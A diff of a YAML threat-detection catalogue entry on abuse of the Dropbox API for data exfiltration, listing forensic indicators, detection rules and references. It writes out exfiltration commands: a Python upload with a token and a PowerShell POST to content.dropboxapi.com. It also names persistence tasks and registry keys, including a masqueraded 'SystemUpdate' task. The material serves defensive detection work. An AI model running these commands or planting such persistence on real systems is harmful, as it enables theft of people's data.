@@ -1,6 +1,8 @@
 Name: Dropbox API
 Description: >
-  Use of the Dropbox Application Programming Interface (API) for data exfiltration via authenticated HTTPS calls, bypassing the official Dropbox desktop client.
+  Use of the Dropbox Application Programming Interface (API) for data exfiltration via authenticated HTTPS calls,
+  bypassing the official Dropbox desktop client. Threat actors abuse API tokens, OAuth flows, or hardcoded credentials
+  to upload targeted data directly to attacker-controlled Dropbox accounts using scripts or custom tooling.
 Category: third-party
 Platform:
   - Windows
@@ -10,59 +12,68 @@ Execution:
   - api
   - cli
 Capabilities:
-  - file-upload                # Supports uploading files directly via Dropbox API.
-  - scheduled-execution        # Can be triggered via Scheduled Tasks or cron jobs.
-  - stealth-upload             # Operates silently with minimal user interaction or logs.
-  - targeted-exfiltration      # Can exfiltrate specific file paths to attacker-controlled Dropbox.
+  - file-upload                # Upload files directly via Dropbox API endpoints.
+  - targeted-exfiltration      # Upload specific files or directories rather than full sync.
+  - stealth-upload             # Operates without visible UI or sync indicators.
+  - background-execution       # Commonly executed via scripts, scheduled tasks, or services.
+  - credential-abuse           # Relies on stolen OAuth tokens or hardcoded API keys.
 Forensics:
+  BinaryLocations:
+    - python.exe               # Common interpreter used for Dropbox API scripts.
+    - powershell.exe           # Used for REST-based Dropbox API calls.
+    - /usr/bin/python3
+    - /usr/bin/python
   FileNamePatterns:
     - dropboxapi.py
     - dropbox_client.py
+    - dropbox_upload.py
     - dropbox_uploader.sh
-    - dropbox.exe              # If using a compiled wrapper or renamed executable.
-  BinaryLocations:
-    - C:\Program Files\Dropbox\Client\Dropbox.exe
-    - C:\Users\<username>\AppData\Roaming\Dropbox\bin\Dropbox.exe
-    - /Applications/Dropbox.app/Contents/MacOS/Dropbox
-    - ~/Dropbox/.dropbox-dist/dropboxd
-    - /usr/bin/dropbox
-    - /usr/local/bin/dropbox
   CommandLineArgs:
-    - dropbox.Dropbox(token).files_upload
-    - requests.post
-    - --token
-    - --filepath
-    - --dropbox-path
+    Description: Common parameters and function calls observed in Dropbox API exfiltration scripts.
+    Indicators:
+      - dropbox.Dropbox(token)         # Dropbox Python SDK initialization with API token.
+      - files_upload                   # Dropbox API file upload method.
+      - requests.post                  # Generic REST invocation to Dropbox endpoints.
+      - --token                        # Command-line supplied OAuth or API token.
+      - --filepath                     # Local file path selected for exfiltration.
+      - --dropbox-path                 # Remote path in attacker-controlled Dropbox.
   ConfigFiles:
     - USERPROFILE\\.dropbox_api_token
     - USERPROFILE\\AppData\\Roaming\\DropboxAPI\\config.json
     - USERPROFILE\\Documents\\dropbox_script_config.json
     - ~/.dropbox_api_token
     - ~/.config/dropbox_api/config.json
-  ScheduledTask:
-    - Name: DropboxExfilTask
-      Description: Executes a script that uploads files via the Dropbox API every 15 minutes.
-      Command: powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\dropbox_exfil.ps1
-    - Name: SystemUpdate
-      Description: Masqueraded task triggering Python-based Dropbox exfiltration.
-      Command: python C:\Users\Public\update_client.py
   RegistryPersistence:
     - HKCU\Software\Microsoft\Windows\CurrentVersion\Run\DropboxUploader
     - HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce\SystemUpdater
-    - HKLM\Software\Microsoft\Windows\CurrentVersion\Run\DropSyncService
   LogFiles:
-    - ~/.dropbox/command.log
-    - ~/.dropbox/logs/dropbox.log
-    - C:\Users\<user>\AppData\Local\Dropbox\logs\*
-    - C:\Users\<user>\Dropbox\.dropbox.cache\*
-    - /var/log/dropbox.log
+    - ~/.dropbox_api.log
+    - ~/.cache/dropbox_api.log
   NetworkArtifacts:
     Description: >
-      Dropbox API traffic occurs over HTTPS, targeting official Dropbox endpoints.
-      Detection may include monitoring upload spikes, token-based authentication, or unauthorized Dropbox access.
+      Dropbox API traffic occurs over HTTPS and targets official Dropbox API endpoints.
+      These domains are stable and suitable for rule-based detection.
     Indicators:
-      - 'api.dropboxapi.com'
-      - 'content.dropboxapi.com'
+      - api.dropboxapi.com
+      - content.dropboxapi.com
+  ScheduledTask:
+    - Name: DropboxExfilTask
+      Description: Executes a script that uploads files via the Dropbox API at regular intervals.
+      Command: powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\dropbox_exfil.ps1
+    - Name: SystemUpdate
+      Description: Masqueraded task triggering Python-based Dropbox API exfiltration.
+      Command: python C:\Users\Public\update_client.py
+NetworkBehavior:
+  Description: >
+    Dropbox API abuse generates authenticated HTTPS requests to Dropbox REST endpoints,
+    typically using POST requests to upload file content. During exfiltration, attackers
+    perform targeted uploads, often in small batches, to avoid detection and blend with
+    legitimate cloud API usage.
+  Behaviors:
+    - HTTPS connections to api.dropboxapi.com and content.dropboxapi.com over port 443
+    - Authenticated API requests using OAuth or long-lived access tokens
+    - Repeated file upload requests without corresponding local Dropbox client activity
+    - Script-driven execution with no user-facing indicators
 ThreatActors:
   - ransomware
   - apt
@@ -71,20 +82,20 @@ UseCases:
     Description: Python script using Dropbox SDK and hardcoded token to upload sensitive files.
     Command: python dropbox_upload.py --token=<TOKEN> --filepath=C:\Sensitive\file.txt --dropbox-path=/exfil/file.txt
   - Title: Stealth PowerShell Dropbox API call
-    Description: PowerShell script using Invoke-RestMethod to POST to Dropbox API endpoints.
-    Command: Invoke-RestMethod -Uri 'https://content.dropboxapi.com/2/files/upload' -Method Post -Headers $headers -Body $file
+    Description: PowerShell script using Invoke-RestMethod to POST directly to Dropbox API endpoints.
+    Command: Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -Headers $headers -Body $file
 Detection:
   - Type: Process Creation
-    Description: Detect python.exe or powershell.exe invoking Dropbox API scripts, especially from non-standard directories or off-hours.
-  - Type: Network
-    Description: Alert on POST requests to Dropbox API domains from unusual users or unauthorized endpoints.
+    Description: Detect python.exe or powershell.exe executing Dropbox API scripts from non-standard directories.
+  - Type: Network Indicator
+    Description: Alert on POST requests to api.dropboxapi.com or content.dropboxapi.com from hosts without Dropbox client usage.
   - Type: Persistence
-    Description: Flag suspicious scheduled tasks or registry entries launching Dropbox API scripts or with obfuscated names.
+    Description: Detect scheduled tasks or registry entries launching Dropbox API scripts.
   - Type: Token Storage
-    Description: Monitor creation or access to token/config files not used by official Dropbox clients.
+    Description: Monitor creation or access to Dropbox API token files outside official SDK locations.
 References:
   - https://help.dropbox.com/develop/developer-reference-overview
   - https://www.bleepingcomputer.com/news/security/ransomware-gangs-now-use-dropbox-for-data-exfiltration/
   - https://www.huntress.com/blog/using-backup-utilities-for-data-exfiltration
   - https://www.cisa.gov/sites/default/files/publications/cybersecurity-advisory_data-encryption-and-exfiltration-before-ransomware-deployment_2023.pdf
-LastModified: '2025-11-17'
+LastModified: '2025-12-12'
